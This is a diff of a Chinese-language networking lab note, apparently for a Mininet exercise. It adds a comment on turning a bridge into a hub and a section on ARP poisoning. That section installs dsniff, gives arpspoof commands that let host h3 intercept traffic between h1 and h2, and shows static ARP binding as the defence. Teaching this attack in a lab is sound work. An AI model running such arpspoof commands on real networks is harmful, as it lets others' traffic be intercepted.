@@ -178,7 +178,7 @@ if '__main__'==__name__:
   br0.cmd("brctl addif mybr br0-eth0")
   br0.cmd("brctl addif mybr br0-eth1")
   br0.cmd("brctl addif mybr br0-eth2")
-  #br0.cmd("brctl setageing mybr 0")
+  #br0.cmd("brctl setageing mybr 0")  #將交換機設為hub，每次傳送封包都進行廣播
   br0.cmd("ifconfig mybr up")
   h1.cmd("ifconfig h1-eth0 down")
   h1.cmd("ifconfig h1-eth0 hw ether 00:00:00:00:00:01")
@@ -201,3 +201,25 @@ if '__main__'==__name__:
 ![](w4-5-3.png)
 * h3開wireshark觀察
 ![](w4-5-4.png)
+
+### 範例六-arp poisoning
+* 安裝dsniff
+```
+# apt install dsniff
+``` 
+
+* 攻擊流程圖
+![](w4-6-1.png)
+
+* 攻擊h1 h2
+```
+h3> arpspoof -i h3-eth0 -t 10.0.0.1 10.0.0.2
+h3> arpspoof -i h3-eth0 -t 10.0.0.2 10.0.0.1
+```
+
+* 防範方法-綁定靜態arp
+![](w4-6-2.png)
+```
+h1> arp -s 10.0.0.2 00:00:00:00:00:02
+h2> arp -s 10.0.0.1 00:00:00:00:00:01
+```
